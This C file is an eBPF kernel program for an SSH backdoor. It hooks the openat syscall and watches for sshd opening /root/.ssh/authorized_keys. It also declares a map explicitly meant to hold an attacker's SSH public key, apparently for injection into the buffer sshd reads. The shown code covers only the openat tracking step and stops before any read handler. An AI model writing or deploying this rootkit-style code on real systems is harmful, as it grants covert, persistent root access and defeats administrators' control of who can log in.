#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

// __EXPORTED_STRUCT is alias of unused attribute.
#define __EXPORTED_STRUCT __attribute__((unused))

#define __EXPORTED_DEFINE(exported_struct_name, useless_identifier) \
    const struct exported_struct_name *useless_identifier __EXPORTED_STRUCT

#define max_payload_len 450
#define TASK_COMM_LEN 16

// Optional Target Parent PID
const volatile int target_ppid = 0;
// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;

// Map to hold the File Descriptors from 'openat' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);         // key is pid_tgid
    __type(value, unsigned int); // value are always zero.
} map_fds SEC(".maps");

// struct to store the buffer mem id and buffer
struct syscall_read_logging 
{
    long unsigned int buffer_addr; // char buffer pointer addr
    long int calling_size; // read(size) store the size.
};

// Map to fold the buffer sized from 'read' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);              // key is pid_tgid
    // __type(value, long unsigned int); // char buffer pointer location
    __type(value, struct syscall_read_logging); 
} map_buff_addrs SEC(".maps");

// struct defined custom_payload to get usermode ssh key string
struct custom_payload
{
    u8 raw_buf[max_payload_len];
    u32 payload_len;
};
__EXPORTED_DEFINE(custom_payload, unused2);
// Map to hold the hackers key ssh keys.
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u8);                    // key is id
    __type(value, struct custom_payload ); // value is ssh pub key
} map_payload_buffer SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    // struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (target_ppid != 0)
    {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid)
        {
            return 0;
        }
    }

    // Check comm is sshd
    char comm[TASK_COMM_LEN];
    if(bpf_get_current_comm(&comm, TASK_COMM_LEN)) {
        return 0;
    }

    const int sshd_len = 5;
    const char *sshd = "sshd";
    for (int i = 0; i < sshd_len; i++)
    {
        if (comm[i] != sshd[i])
        {
            return 0;
        }
    }

    // Now check we're opening authorized_keys
    const char *ssh_authorized_keys = "/root/.ssh/authorized_keys";
    const int ssh_authorized_keys_len = 27;
    char filename[ssh_authorized_keys_len];
    bpf_probe_read_user(&filename, ssh_authorized_keys_len, (char*)ctx->args[1]);
    for (int i = 0; i < ssh_authorized_keys_len; i++) {
        if (filename[i] != ssh_authorized_keys[i]) {
            return 0;
        }
    }

    // Print Command and Filename info
    bpf_printk("Comm %s\n", comm);
    bpf_printk("Filename %s\n", filename);

    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}
    